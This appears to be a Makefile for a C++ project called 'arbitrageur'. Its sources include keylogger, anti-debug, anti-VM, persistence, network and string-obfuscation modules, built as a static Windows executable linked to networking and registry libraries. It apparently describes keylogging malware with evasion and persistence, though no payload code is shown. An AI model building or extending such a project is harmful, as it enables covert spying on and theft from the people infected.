CXX = g++
MINGW_CXX = x86_64-w64-mingw32-g++
CXXFLAGS = -std=c++17 -Wall -Wextra -Iinclude -D_WIN32_WINNT=0x0601
DEBUG_FLAGS = -g -DDEBUG
RELEASE_FLAGS = -O2 -DNDEBUG

# Source and object files
SRCDIR = src
TESTDIR = tests/unit
SOURCES = src/anti_debug.cpp src/anti_vm.cpp src/keylogger.cpp src/main.cpp src/network.cpp src/persistence.cpp src/utils.cpp src/obfuscated_strings.cpp
TEST_SOURCES = $(wildcard $(TESTDIR)/*.cpp)
OBJECTS = $(SOURCES:.cpp=.o)

# Targets
TARGET = arbitrageur
WIN_TARGET = arbitrageur.exe
TEST_TARGET = run_tests

.PHONY: all clean test windows debug release

# Default build (Linux debug)
all: debug

# Debug build (Linux)
debug: CXXFLAGS += $(DEBUG_FLAGS)
debug: $(TARGET)

# Release build (Linux)
release: CXXFLAGS += $(RELEASE_FLAGS)
release: $(TARGET)

# Windows build
windows: $(WIN_TARGET)

test: 
	@echo "Building individual test files..."
	@for test in $(TEST_SOURCES); do \
		echo "Building $$test..."; \
		$(CXX) $(CXXFLAGS) $(DEBUG_FLAGS) -o $${test%.cpp} $$test; \
	done
	@echo "Running tests..."
	@passed=0; total=0; \
	for test in $(TEST_SOURCES); do \
		echo "Running $${test%.cpp}..."; \
		if ./$${test%.cpp}; then \
			passed=$$((passed + 1)); \
		fi; \
		total=$$((total + 1)); \
		echo ""; \
	done; \
	echo "Test Summary: $$passed/$$total tests passed!"

# Main target (Linux)
$(TARGET): $(OBJECTS)
	$(CXX) $(CXXFLAGS) -o $@ $^
	#
	#
# Windows target
$(WIN_TARGET): $(SOURCES)
	$(MINGW_CXX) $(CXXFLAGS) $(RELEASE_FLAGS) -static \
		-I$(HOME)/local/x86_64-w64-mingw32/include \
		-L$(HOME)/local/x86_64-w64-mingw32/lib \
		-o $@ $^ -lwininet -luser32 -ladvapi32


# Test target - build with platform detection
# Test target
$(TEST_TARGET): $(TEST_SOURCES)
	@echo "Building individual test files..."
	@for test in $(TEST_SOURCES); do \
		echo "Building $$test..."; \
		$(CXX) $(CXXFLAGS) $(DEBUG_FLAGS) -o $${test%.cpp} $$test; \
	done
	@echo "Running tests..."
	@for test in $(TEST_SOURCES); do \
		echo "Running $${test%.cpp}..."; \
		./$${test%.cpp}; \
		echo ""; \
	done
	@echo "All tests completed!"

clean:
	rm -f $(OBJECTS) $(TARGET) $(WIN_TARGET) 
	rm -f tests/unit/test_crypto tests/unit/test_commands tests/unit/test_utils tests/unit/test_string_ops
